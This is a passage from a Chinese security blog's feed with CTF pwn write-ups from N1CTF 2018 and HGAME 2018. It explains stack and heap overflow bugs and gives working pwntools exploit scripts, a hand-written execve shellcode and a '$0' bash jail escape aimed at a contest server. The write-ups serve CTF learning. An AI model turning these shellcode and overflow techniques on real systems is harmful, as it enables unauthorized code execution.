class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./null'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./null'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Enter secret password:'</span>)</span><br><span class="line">p.send(<span class="string">'i\'m ready for challenge\n'</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">1000</span><span class="number">-1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">1000</span><span class="number">-1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">1000</span>))</span><br><span class="line">p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">1000</span><span class="number">-1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">90</span><span class="number">-1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x4000</span>))</span><br><span class="line">p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input:'</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'/bin/sh\0'</span>+p64(<span class="number">0</span>)*(<span class="number">2</span>+<span class="number">4</span>+<span class="number">2</span>+<span class="number">8</span>+<span class="number">3</span><span class="number">-1</span>))</span><br><span class="line">padding = p64(<span class="number">0</span>)*(<span class="number">0x4000</span>/<span class="number">8</span><span class="number">-2</span><span class="number">-4</span><span class="number">-8</span><span class="number">-3</span>) +p64(<span class="number">0</span>)+ p64(<span class="number">0x11</span>) + p64(<span class="number">0</span>)*<span class="number">4</span> +p64(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x60201d</span>)+ p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment">#p64(0x602028-4)</span></span><br><span class="line"><span class="keyword">print</span> hex(len(padding))</span><br><span class="line">p.send(padding)</span><br><span class="line"><span class="comment">#gdb.attach(p,'info threads')</span></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x60</span>))</span><br><span class="line">p.recvuntil(<span class="string">'blocks:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'(0/1):'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input:'</span>)</span><br><span class="line">p.send(<span class="string">'sh\0'</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x400978</span>)+p64(<span class="number">0</span>)*(<span class="number">0x60</span>/<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ol><li>打完这次比赛，感觉和大佬们的差距无限大，还是要好好读书的。</li><li>想到一个新的出题思路，既然程序的分配区是复用的，那么当一个程序的线程足够多的时候，主线程和某个线程所使用的分配区是一样的，在其他线程出现堆溢出的问题，同样可以影响主线程，比如如下的实验</li></ol></li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> num;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_func</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *a ;</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[%d] malloc address %p\n"</span>,num++,a);</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> tid[<span class="number">40</span>];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">void</span> * ret;</span><br><span class="line"><span class="keyword">char</span> *a;</span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is a test for thread arena! %d\n"</span>,num);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">33</span>;i++)&#123;</span><br><span class="line">pthread_create(&amp;tid[i],<span class="literal">NULL</span>,thread_func,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] main malloc address %p\n"</span>,a);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">33</span>;i++)&#123;</span><br><span class="line"><span class="comment">//pthread_create(&amp;tid[i],NULL,thread_func,NULL);</span></span><br><span class="line">pthread_join(tid[i],<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/n1ctf2018/3.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道。&lt;/p&gt;
&lt;h1 id=&quot;vote&quot;&gt;&lt;a href=&quot;#vote&quot; class=&quot;headerlink&quot; title=&quot;vote&quot;&gt;&lt;/a&gt;vote&lt;/h1&gt;&lt;p&gt;一道比较常规套路的fastbi
      
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="Linux" scheme="http://p4nda.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2018 PWN题记录</title>
    <link href="http://p4nda.top/2018/03/06/hgame/"/>
    <id>http://p4nda.top/2018/03/06/hgame/</id>
    <published>2018-03-05T16:00:00.000Z</published>
    <updated>2018-03-04T05:25:33.843Z</updated>
    
    <content type="html"><![CDATA[<p>HGAME 2018是由杭电的Vidar-Team举办的校内赛，历时一个月，记录一下其中的PWN题目。</p><h1 id="LEVEL-WEEK-1"><a href="#LEVEL-WEEK-1" class="headerlink" title="LEVEL - WEEK 1"></a>LEVEL - WEEK 1</h1><h2 id="guess-number"><a href="#guess-number" class="headerlink" title="guess_number"></a>guess_number</h2><p>题目流程很简单，首先使用/dev/urandom文件生成随机数，使用这个随机数作为rand()的种子，生成随机数，与用户输入的随机数进行比较，比较正确就会返回system(‘cat flag’)。</p><p><img src="/img/hgame2018/1_1_1.png" alt=""></p><p>这题存在一个明显的栈溢出漏洞，但是开启了canary保护。起初思路被urandom函数带偏了，以为是要用伪随机本地爆破rand()种子，再进行生成，还暗搓搓的感叹好难啊。。后来发现在guess_num函数中的栈溢出是可以利用的，这个随机数是以参数的方式传入的，在比较时寻址方式是用ebp+4来寻址的，也就是说利用栈溢出覆盖，完全可以将随机数覆盖成任意值。</p><p>解题的exp脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./guess_number'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'enter your guess:'</span>)</span><br><span class="line">a = <span class="string">"0\x00"</span></span><br><span class="line">a = a.ljust(<span class="number">0x128</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> len(a)</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="flag-server"><a href="#flag-server" class="headerlink" title="flag_server"></a>flag_server</h2><p>题目的内容是一个登陆系统，当用户输入”admin”和随机数密码时可以将一个v9变量赋值为1，进一步可以执行system(‘cat flag’)</p><p><img src="/img/hgame2018/1_2_1.png" alt=""></p><p>其中，存在一个明显的整数负数溢出漏洞，当输入的长度是负数的时候，可以输入任意长的内容，在read_n函数中溢出，则可以覆盖到调用read_n函数的main函数栈中，进一步可以覆盖v9变量为任意值，导致控制逻辑流程。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./flag_server'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10001</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your username length: '</span>)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'whats your username?'</span>)</span><br><span class="line">a = <span class="string">"admin"</span></span><br><span class="line">a = a.ljust(<span class="number">0x50</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">print</span> len(a)</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="zazahui"><a href="#zazahui" class="headerlink" title="zazahui"></a>zazahui</h2><p>一道贪玩蓝月梗的题目，在初始化函数中，分别将广告词和flag读到bss段中，在sub_8048698()函数中，一直让用户输入广告词。</p><p><img src="/img/hgame2018/1_3_1.png" alt=""></p><p>漏洞被故意留在sub_8048698函数中，根据栈中变量位置和输入长度可以很明显的发现可以覆盖s这个变量，当把变量覆盖为flag地址时，在puts(s)中就可以读出flag。</p><p>使用的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./zazahui'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p,<span class="string">'b *0x80486D5'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10003</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">a= <span class="string">'a'</span>*<span class="number">0xb0</span>+p32(<span class="number">0x804A060</span>)+p32(<span class="number">0x99</span>)</span><br><span class="line">p.sendline(a)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="LEVEL-WEEK-2"><a href="#LEVEL-WEEK-2" class="headerlink" title="LEVEL - WEEK 2"></a>LEVEL - WEEK 2</h1><h2 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h2><p>代码逻辑从题目名字中就可猜测出来，用户输入一串shellcode，程序来执行，仅仅限制了shellcode长度不超过24个字节。</p><p><img src="/img/hgame2018/2_1_1.png" alt=""></p><p>这样一来，pwntools的shellcraft.sh()就不能用了，只能手写一个shellcode拿到shell。其原理是执行int 80h，使得ebp指向’/bin/sh’,eax的值是0xb,ecx、edx置零就可以了。</p><p>解题使用的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./ez_shellcode'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p,<span class="string">'b *0x8048663'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10004</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">push 0x732f2f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push 0xb</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">a = shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> len(asm(shellcode))</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-bash-jail"><a href="#ez-bash-jail" class="headerlink" title="ez_bash_jail"></a>ez_bash_jail</h2><p>此题给用户一个system(lineptr)的权利，但是限制了用户输入’abcfhgilnst<em>‘这些字母。这样一来如’cat flag’、’cat fl\</em>‘、’sh’、’/bin/sh’就都不能用了。</p><p><img src="/img/hgame2018/2_2_1.png" alt=""></p><p>题目给了hint，是研究一下system源码：<a href="https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="number">116</span><span class="meta">#<span class="meta-keyword">ifdef</span> FORK</span></span><br><span class="line"><span class="number">117</span>  pid = FORK ();</span><br><span class="line"><span class="number">118</span><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="number">119</span>  pid = __fork ();</span><br><span class="line"><span class="number">120</span><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="number">121</span>  <span class="keyword">if</span> (pid == (<span class="keyword">pid_t</span>) <span class="number">0</span>)</span><br><span class="line"><span class="number">122</span>    &#123;</span><br><span class="line"><span class="number">123</span>      <span class="comment">/* Child side.  */</span></span><br><span class="line"><span class="number">124</span>      <span class="keyword">const</span> <span class="keyword">char</span> *new_argv[<span class="number">4</span>];</span><br><span class="line"><span class="number">125</span>      new_argv[<span class="number">0</span>] = SHELL_NAME;</span><br><span class="line"><span class="number">126</span>      new_argv[<span class="number">1</span>] = <span class="string">"-c"</span>;</span><br><span class="line"><span class="number">127</span>      new_argv[<span class="number">2</span>] = line;</span><br><span class="line"><span class="number">128</span>      new_argv[<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">129</span></span><br><span class="line"><span class="number">130</span>      <span class="comment">/* Restore the signals.  */</span></span><br><span class="line"><span class="number">131</span>      (<span class="keyword">void</span>) __sigaction (SIGINT, &amp;intr, (struct sigaction *) <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">132</span>      (<span class="keyword">void</span>) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">133</span>      (<span class="keyword">void</span>) __sigprocmask (SIG_SETMASK, &amp;omask, (<span class="keyword">sigset_t</span> *) <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">134</span>      INIT_LOCK ();</span><br><span class="line"><span class="number">135</span></span><br><span class="line"><span class="number">136</span>      <span class="comment">/* Exec the shell.  */</span></span><br><span class="line"><span class="number">137</span>      (<span class="keyword">void</span>) __execve (SHELL_PATH, (<span class="keyword">char</span> *<span class="keyword">const</span> *) new_argv, __environ);</span><br><span class="line"><span class="number">138</span>      _exit (<span class="number">127</span>);</span><br><span class="line"><span class="number">139</span>    &#125;</span><br><span class="line"><span class="number">140</span>  <span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; (<span class="keyword">pid_t</span>) <span class="number">0</span>)</span><br><span class="line"><span class="number">141</span>    <span class="comment">/* The fork failed.  */</span></span><br><span class="line"><span class="number">142</span>    status = <span class="number">-1</span>;</span><br><span class="line"><span class="number">143</span>  <span class="keyword">else</span></span><br><span class="line"><span class="number">144</span>    <span class="comment">/* Parent side.  */</span></span><br><span class="line"><span class="number">145</span>    &#123;</span><br><span class="line"><span class="number">146</span>      <span class="comment">/* Note the system() is a cancellation point.  But since we call</span></span><br><span class="line"><span class="comment">147         waitpid() which itself is a cancellation point we do not</span></span><br><span class="line"><span class="comment">148         have to do anything here.  */</span></span><br><span class="line"><span class="number">149</span>      <span class="keyword">if</span> (TEMP_FAILURE_RETRY (__waitpid (pid, &amp;status, <span class="number">0</span>)) != pid)</span><br><span class="line"><span class="number">150</span>        status = <span class="number">-1</span>;</span><br><span class="line"><span class="number">151</span>    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到system的最后是执行了execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=lineptr 的。</p><p>再看一下execve的用法是什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。</span><br></pre></td></tr></table></figure><p>就是可以重新执行一份新的代码。</p><p>再看下一个hint，学习一下shell的变量,正则等等?</p><p>题目中过滤了许多正常字符，但是\$符号没有被过滤，$是bash脚本中一个特殊的符号，可以定义变量，在搜索中发现bash中有几个特殊的变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$0就是该bash文件名</span><br><span class="line">$?是上一指令的返回值</span><br><span class="line">$*所有位置参数的内容：就是调用调用本bash shell的参数。</span><br><span class="line">$@基本上与上面相同。只不过是</span><br><span class="line">“$*”返回的是一个字符串，字符串中存在多外空格。</span><br><span class="line">“$@”返回多个字符串。</span><br><span class="line">&quot;$1&quot;，它代表一条记录中的第一列数据</span><br></pre></td></tr></table></figure><p>其中最特殊的是$0，它是执行execve程序时的filename路径。可以通过如下代码测试出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">#! /bin/sh</span><br><span class="line">echo &quot;=============&quot;</span><br><span class="line">echo $0</span><br><span class="line">echo &quot;=============&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    char *newargv[] = &#123; &quot;xx&quot; &#125;;</span><br><span class="line">    char *newenviron[] = &#123; NULL &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    newargv[0] = argv[1];</span><br><span class="line"></span><br><span class="line">    execve(&quot;./a&quot;, newargv, newenviron);</span><br><span class="line">    perror(&quot;execve&quot;);   /* execve() only returns on error */</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此可以发现在题目中执行system(lineptr)时，如果lineptr=’$0’的话，实际上执行的是execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=’\$0’</p><p>而\$0就是’/bin/sh’，进一步就获得了shell。</p><p>题解的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./bash_jail'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x8048663')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10006</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'$0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 